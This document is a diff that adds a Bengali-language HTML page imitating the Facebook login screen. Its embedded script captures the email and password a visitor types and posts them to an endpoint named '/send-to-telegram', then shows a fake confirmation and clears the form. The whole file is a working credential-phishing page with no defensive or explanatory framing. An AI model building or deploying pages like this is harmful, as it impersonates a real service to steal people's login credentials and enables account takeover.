@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8">
+  <title>ফেসবুক লগইন</title>
+  <style>
+    body { background: #f0f2f5; font-family: Arial, sans-serif; }
+    .login-box {
+      width: 360px; margin: 70px auto; background: #fff; border-radius: 7px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1); padding: 30px 30px 20px 30px;
+    }
+    .fb-logo { color: #1877f2; font-size: 40px; font-weight: bold; text-align: center; }
+    .login-title { text-align: center; font-size: 20px; margin-bottom: 20px; }
+    input[type="text"], input[type="password"] {
+      width: 100%; padding: 12px; margin-bottom: 12px; border: 1px solid #ddd;
+      border-radius: 4px; font-size: 15px;
+    }
+    button {
+      width: 100%; background: #1877f2; color: #fff; border: none;
+      padding: 12px; font-size: 16px; border-radius: 4px; cursor: pointer;
+      font-weight: bold;
+    }
+    button:hover { background: #155dc1; }
+    .forgot { display: block; text-align: center; margin-top: 13px; color: #1877f2; text-decoration: none; }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <div class="fb-logo">facebook</div>
+    <div class="login-title">ফেসবুকে লগইন করুন</div>
+    <form id="loginForm">
+      <input type="text" name="email" placeholder="ইমেইল ঠিকানা অথবা মোবাইল নম্বর" required>
+      <input type="password" name="password" placeholder="পাসওয়ার্ড" required>
+      <button type="submit">লগইন করুন</button>
+    </form>
+    <a href="#" class="forgot">পাসওয়ার্ড ভুলে গেছেন?</a>
+  </div>
+  <script>
+    document.getElementById('loginForm').onsubmit = async function(e) {
+      e.preventDefault();
+      const email = e.target.email.value;
+      const password = e.target.password.value;
+      await fetch('/send-to-telegram', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({email, password})
+      });
+      alert('লগইন রিকুয়েস্ট পাঠানো হয়েছে।');
+      e.target.reset();
+    };
+  </script>
+</body>
+</html>
